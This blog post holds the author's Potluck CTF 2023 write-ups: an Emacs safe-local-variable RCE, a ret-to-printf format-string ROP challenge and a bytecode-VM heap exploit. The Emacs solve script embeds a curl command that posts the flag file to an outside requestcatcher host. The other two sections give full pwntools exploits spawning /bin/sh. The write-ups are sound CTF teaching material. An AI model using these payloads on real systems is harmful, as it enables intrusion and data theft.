---
layout: post
title: "Potluck CTF 2023 Write-Ups"
date: 2023-03-28
categories: ctf rev pwn c emacs
---

# Intro
Potluck CTF was a very exciting new ctf made by ZetaTwo so we decided to participate. In short, a new idea it brought to the table is that to join the CTF every team must create a challenge for it. I decided to donate one of my challenges I made for our CTF that will happen in the future TM (or at least that's the plan). We didn't solved much and participated more casually but since I made a chall there I decided to make a write-up for it and with it some of the other challenges I solved.

# Emacro-wave Cooking
First is the challenge made by me. It only had 6 solves with a lot of top teams participating but I wouldn't call it hard, it's more of a difficulty by obscurity rather than by complexity. We're given a `chall.py` and some other files but they exist only to simulate a victim opening a file we send them in Emacs with the following config:
```elisp
(defvar cooking-motivation-generator
  '(let* ((random-number (random 3))
	  (messages '("Never give up!"
		      "Do the impossible, see the invisible!" 
		      "Believe in me that believes in you!"))
	  (random-message (nth random-number messages)))
     (message random-message)))
(make-variable-buffer-local 'cooking-motivation-generator)
(put 'cooking-motivation-generator 'safe-local-variable (lambda (_) t))
(run-with-timer 2 2 (lambda () (eval cooking-motivation-generator)))
```
The idea is to that Emacs will look at commented lines at the beginning and end of a file. Those comments can overwrite variables inside of Emacs. This can lead to a more customized user experience but can also lead to a potential security risk. I think you can see where this is going to? Luckily we can mark variables as unsafe or safe. For unsafe variables we are first asked if we want to execute them, safe variables are executed automatically. In the config file we are creating a variable, marking it as safe with `(put 'cooking-motivation-generator 'safe-local-variable (lambda (_) t))` and then it's `eval`ed. Therefore the solution is to achieve RCE and read the flag. You can read more about local variables in files and it's safety there: https://www.gnu.org/software/emacs/manual/html_node/emacs/File-Variables.html .
This is my solve.py that will send the flag to a requestcatcher:
```python
import base64
from pwn import *


recipe = """# Local Variables:
# cooking-motivation-generator: (shell-command (concat "curl -X POST -d \\"" (with-temp-buffer (insert-file-contents "/app/flag.txt") (buffer-string)) "\\" https://nyaaa.requestcatcher.com/test"))
# End:
"""

print(recipe)
print(base64.b64encode(recipe.encode()))
#io = remote("0.0.0.0", 31337)
io = remote("challenge13.play.potluckctf.com", 31337)
io.sendlineafter(b"! ", base64.b64encode(recipe.encode()))
io.interactive()
```
If you never programmed in emacs-lisp the way we read the file may appear weird, but oh well...
One tricky thing that I intentionally left in was that the above code would not work if we used single quotes instead of double quotes cuz the flag contained a one single quote inside. I wonder if anyone was catched off guard by it. :P

# Ezrop
This is a beginner pwn chall with a small 'twist' if you even can call it that. There's some setup code and then everything interesting happens inside the `vuln` function. There's a disassembly of it:
```asm
   0x00000000004011db <+0>:	endbr64
   0x00000000004011df <+4>:	push   rbp
   0x00000000004011e0 <+5>:	mov    rbp,rsp
   0x00000000004011e3 <+8>:	sub    rsp,0x20
   0x00000000004011e7 <+12>:	lea    rax,[rip+0xe16]        # 0x402004
   0x00000000004011ee <+19>:	mov    rdi,rax
   0x00000000004011f1 <+22>:	mov    eax,0x0
   0x00000000004011f6 <+27>:	call   0x401060 <printf@plt>
   0x00000000004011fb <+32>:	lea    rax,[rbp-0x20]
   0x00000000004011ff <+36>:	mov    rdi,rax
   0x0000000000401202 <+39>:	mov    eax,0x0
   0x0000000000401207 <+44>:	call   0x401070 <gets@plt>
   0x000000000040120c <+49>:	nop
   0x000000000040120d <+50>:	leave
   0x000000000040120e <+51>:	ret
```
We call printf with a hardcoded string and then we call gets. The binary doesn't have ALSR turned on and we have an obvious buffer overflow so we can return back to the binary. The question is where do we turn to? There are no `pop rdi` gadgets inside of the binary so this is not an option. Turns out that while returning from this function the string we wrote to in `gets` is inside of rax so we can return back to before the printf is called to achieve a string format vulnerability.
```asm
   0x00000000004011ee <+19>:	mov    rdi,rax
   0x00000000004011f1 <+22>:	mov    eax,0x0
   0x00000000004011f6 <+27>:	call   0x401060 <printf@plt>
```
It's dictated by the ABI that rdi is the first argument of any function, so we move our string to rdi and then we call `printf` with it.
We use the string format vuln to achieve a libc leak and then we write a trivial rop chain. One thing to watch out is that we also overwrite the rbp while overflowing so it needs to be set to a writeable memory segment. I set it to `0x404a00`. If we use an address "too close to the boarder from the left" the stack will overflow below 0x404000 and we will segfault, so you need to watch out for that. This is my whole solution:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./ezrop_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.terminal = ['split_emacsclient.fish']


def conn():
    if args.REMOTE:
        io = remote("challenge19.play.potluckctf.com", 31337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            """)
        else:
            io = process([exe.path])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    rop = p64(0x00000000004011ee)
    fmt = b"%p " * (32//3)
    rbp = p64(0x404a00)
    io.sendline(fmt.ljust(32) + rbp + rop)

    io.recvuntil(b"0x")
    leaks = io.recv(100).decode('ascii').split()
    libc_leak = int(leaks[2], 16)
    info(f"libc_leak: {hex(libc_leak)}")
    libc.address = libc_leak - 2202272

    rop = ROP(libc)
    rop.raw(rop.ret)
    rop.call('system', [next(libc.search(b'/bin/sh'))])
    io.sendline(cyclic(40) + bytes(rop))
    
    io.interactive()


if __name__ == "__main__":
    main()
```

# Schrödinger's P1G
In this challenge we basically get a bytecode interpreter that we will be exploiting. Luckily for us the binary is not stripped so reversing is trivial. Let's start with reversing! First let's look at the main decompilation. There's some initialization code, mostly nothing interesting for us. We can see there that using `stdout` as the arguments will make the program read the code from stdin (which is confusing but whatever).
```c
undefined8 main(EVP_PKEY_CTX *param_1,long param_2)

{
  int ret;
  undefined8 uVar1;
  void *__buf;
  int is_stdout;
  
  init(param_1);
  if ((int)param_1 == 2) {
    ret = strcmp(*(char **)(param_2 + 8),"stdout");
    if (ret == 0) {
      is_stdout = 0;
    }
    else {
      is_stdout = open(*(char **)(param_2 + 8),0);
      if (is_stdout == -1) {
        write(1,"Error: Open failed\n",0x14);
        return 0xffffffff;
      }
    }
```
Then the code is read, parsed and runned:
```c
    __buf = calloc(1,0x20000);
    read(is_stdout,__buf,0x20000);
    parser(__buf);
    vmRun();
    uVar1 = 1;
```
One thing to notice about how it's read is that its just one call to `read`. This makes it annoying to play around with cuz we can't use the shell for it because a shell will stop reading when it encounters a newline and the program expects a bunch of newlines. Instead we need to use pwntools or maybe pipeing. Anyway, let's first look into how it's ran and after that how it's parsed.
```c
void vmRun(void)

{
  long in_FS_OFFSET;
  int i;
  int j;
  int thread_i [8];
  pthread_t threads [5];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  for (i = 0; i <= mcode_count; i = i + 1) {
    thread_i[i] = i;
    pthread_create(threads + i,(pthread_attr_t *)0x0,vm,thread_i + i);
  }
  for (j = 0; j <= mcode_count; j = j + 1) {
    pthread_join(threads[j],(void **)0x0);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looks like we can create a bunch of threads, each thread will run it's own instructions with with the `vm` function. Later turns out the threads are mostly to look scary and we will *almost* not use them at all. Alright, now let's look at the parsing that will transform the instruction we give it into bytecode.

```c
undefined8 parser(char *param_1)

{
  int iVar1;
  void *pvVar2;
  long in_FS_OFFSET;
  char *local_68;
  char *local_60;
  char *local_58;
  char *local_50;
  char *local_48;
  char *local_40;
  char *local_38;
  char *local_30;
  char *local_28;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_58 = strtok_r(param_1,"\n",&local_68);
  while (local_58 != (char *)0x0) {
    local_50 = strtok_r(local_58," ",&local_60);
    local_38 = strtok_r((char *)0x0,", ",&local_60);
    local_48 = strtok_r((char *)0x0,", ",&local_60);
    local_30 = local_48;
    local_40 = strtok_r((char *)0x0,", ",&local_60);
    local_28 = local_40;
    iVar1 = strcmp(local_50,"thread");
    if (iVar1 == 0) {
      if (mcode_count == 4) {
        write(1,"Error: Too many thread\n",0x17);
        err();
      }
      iVar1 = mcode_count + 1;
      mcode_count = iVar1;
      pvVar2 = calloc(1,0x10000);
      (&mcode)[iVar1] = pvVar2;
    }
    else if (mcode_count == -1) {
      write(1,"Error: There is no thread\n",0x1a);
      err();
    }
    else {
      generate_mcode(local_50,local_38,local_30,local_28);
    }
    local_58 = strtok_r((char *)0x0,"\n",&local_68);
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

I'll spare you the details. Basically the function looks for a line "thread" to create a new thread and then it will run the following instruction we give it. The instructions are transformed into bytecode in the `generate_mcode` function. Those are my notes from all the instructions:
```
print r0 0x123 0x123
alloc r0 size
copy r0 r1 offset
read r0 r1 offset
write r0 r1 offset
add r0, 0x123
# shl, shr, mov, etc is the same
lock
unlock 0x123
pause
mov2 r0 r1
# other inst2 are the same
```

We don't get an instruction go get an input from the user so the exploit will need to be written fully in this custom bytecode.
What alloc does is it allocates memory on the heap and stores in in a register we give it. It stores the length of the allocation in `regs[arg1+0xc]` and it looks like the code for instructions like write and read checks this length, but it's very easy to avoid it.
```c
      case 0xb:
                    /* alloc */
        if (arg2 < 8) {
          write(1,"Error: Runtime Error\n",0x15);
          err();
        }
        pvVar2 = calloc(1,arg2);
        regs[arg1] = (long)pvVar2;
        *(undefined4 *)((long)regs + (arg1 + 0x10) * 4) = 1;
        regs[arg1 + 0xc] = arg2;
        if (regs[arg1] == 0) {
          write(1,"Error: Runtime Error\n",0x15);
          err();
        }
        break;
	  case 0xc:
                    /* write */
        if ((*(int *)((long)regs + (arg1 + 0x10) * 4) == 1) &&
           ((arg3 & 0xffffffff) < regs[arg1 + 0xc] - 8U)) {
          *(long *)(regs[arg1] + (arg3 & 0xffffffff)) = regs[arg2];
        }
        else {
          write(1,"Error: Runtime Error\n",0x15);
          err();
        }
        break;
```

For example we can just do arithmetical operations on the address stored in r0 and the program doesn't care and this is what I will do in the exploit. So let's get to exploiting! I'll be adding additional comments but they are not a part of the exploit.

```
    alloc r0 100  # Allocate memory on the heap and store it in r0
    sub r0 2d0  # Calculate offset to a place on the heap where an address to libc is stored
    read r0 r0 0  # Read this address to r0
```

First we get a libc leak from the heap. Because it's not the main arena from ptmalloc, because it's multithreaded, it stores a pointer to the main arena at the beginning of our second arena and it just so happens that main arena is inside of libc. If you have no idea what I'm talking about this is a good article about ptmalloc internals: https://sourceware.org/glibc/wiki/MallocInternals . The rest of the exploit:
```
    add r0 7580  # Calculate offset inside of libc to a stack address. In this case it's `__environ` but there are a lot of stack addresses inside of libc.
    mov2 r1 r0  # Make a copy of the libc address inside of r1. We will use it while creating a rop chain.
    read r0 r0 0  # Read the stack address into r0
    sub r0 158  # Calculate offset to the return address
    sub r1 1f6e1b  # Calculate offset to the first gadget `pop rdi`
    write r0 r1 0  # Write the gadget into the return address
    add r0 8  # Add 8 to the stack address to continue writing the rop chain
    add r1 1ae293  # Calculate offset to the string `/bin/sh\x00` inside of libc
    write r0 r1 0  # Write it to the stack
    add r0 8
    sub r1 1878dc  # Calculate offset to a `ret` gadget so the stack is alligned while calling `system` later
    write r0 r1 0
    add r0 8
    sub r1 2c  # Calculate offset to the beginning of the `system` function
    write r0 r1 0
```

Then when the program finishes executing we return and our rop chain is executed resulting in a shell. There is the whole exploit code:
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./myP1G_dbg_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ['split_emacsclient.fish']


def conn():
    if args.REMOTE:
        io = remote("challenge21.play.potluckctf.com", 31337)
    else:
        if args.GDB:
            io = gdb.debug([exe.path, 'stdout'], aslr=False, api=False, gdbscript="""
            set follow-fork-mode parent
            b vm
            """)
        else:
            io = process([exe.path, 'stdout'])
            #gdb.attach(io)
    return io


def main():
    io = conn()
    send = """
    thread
    alloc r0 100
    sub r0 2d0
    read r0 r0 0
    add r0 7580
    mov2 r1 r0
    read r0 r0 0
    sub r0 158
    sub r1 1f6e1b
    write r0 r1 0
    add r0 8
    add r1 1ae293
    write r0 r1 0
    add r0 8
    sub r1 1878dc
    write r0 r1 0
    add r0 8
    sub r1 2c
    write r0 r1 0
    """.strip()
    io.sendline(send.encode())
    io.interactive()


if __name__ == "__main__":
    main()
```
